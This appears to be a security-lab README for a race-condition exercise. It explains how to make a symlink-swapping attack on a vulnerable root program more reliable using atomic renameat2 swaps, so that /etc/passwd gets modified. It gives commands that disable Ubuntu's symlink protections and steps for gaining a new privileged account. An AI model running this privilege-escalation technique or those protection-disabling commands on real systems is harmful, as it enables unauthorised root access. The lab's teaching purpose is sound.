# Task 2C: An Improved Attack Method

## Objective
Use atomic operations to avoid race conditions in the attack program itself.

## Problem with Task 2B
The attack program in Task 2B has its own race condition:
- `unlink()` and `symlink()` are two separate system calls
- If the vulnerable program runs between these calls, it creates `/tmp/XYZ` owned by root
- Once root owns the file, the attack program can no longer modify it (due to sticky bit on `/tmp`)

## Solution
Use `renameat2()` with `RENAME_EXCHANGE` flag to atomically swap two symbolic links.

## Setup

1. **Disable Ubuntu's protection** (if not already done):
   ```bash
   sudo sysctl -w fs.protected_symlinks=0
   sudo sysctl fs.protected_regular=0
   ```

2. **Backup the password file**:
   ```bash
   sudo cp /etc/passwd /etc/passwd.backup
   ```

3. **Compile the programs**:
   ```bash
   make
   ```

4. **Make the shell script executable**:
   ```bash
   chmod +x target_process.sh
   ```

## Attack Steps

1. **Run the improved attack program** in one terminal:
   ```bash
   ./attack_improved
   ```

2. **Run the target process** in another terminal:
   ```bash
   ./target_process.sh
   ```

3. **Wait for success**. The script should terminate when `/etc/passwd` is modified.

4. **Stop the attack program** with Ctrl-C

5. **Verify the attack**:
   ```bash
   tail /etc/passwd
   su test
   id
   ```

## How It Works

The `renameat2()` system call with `RENAME_EXCHANGE` flag atomically swaps two paths:
```c
renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", RENAME_EXCHANGE);
```

This ensures:
- `/tmp/XYZ` alternates between pointing to `/dev/null` and `/etc/passwd`
- No window exists where `/tmp/XYZ` doesn't exist
- The vulnerable program cannot create a file owned by root

## Cleanup
```bash
sudo sed -i '/^test:/d' /etc/passwd
sudo rm /tmp/XYZ /tmp/ABC
```

## Expected Observations
- This attack should succeed more reliably than Task 2B
- No manual intervention needed to delete root-owned files
- The atomic swap eliminates the race condition in the attack program
